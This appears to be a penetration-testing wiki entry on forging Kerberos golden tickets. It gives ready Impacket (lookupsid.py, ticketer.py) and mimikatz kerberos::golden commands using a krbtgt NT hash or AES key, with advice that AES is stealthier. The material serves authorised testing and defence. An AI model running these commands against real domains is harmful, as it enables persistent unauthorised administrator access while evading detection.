In order to craft a golden ticket, testers need to find the krbtgt's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a DCSync attack. Because of this, golden tickets only allow lateral movement and not privilege escalation.
!!! note 
    Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.
=== "UNIX-like"
    There are Impacket scripts for each step of a golden ticket creation : retrieving the krbtgt, retrieving the domain SID, creating the golden ticket.
    ```bash
    # Find the domain SID
    lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

    # Create the golden ticket (with an RC4 key, i.e. NT hash)
    ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

    # Create the golden ticket (with an AES 128/256bits key)
    ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

    # Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
    ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
    ```
=== "Windows"
    On Windows, mimikatz (C) can be used with `kerberos::golden` for this attack.
    ```bash
    # with an NT hash
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

    # with an AES 128 key
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

    # with an AES 256 key
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
    ```
    For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket.
!!! note
    For Golden and Silver tickets, it's important to remember that, by default, ticketer and mimikatz forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519).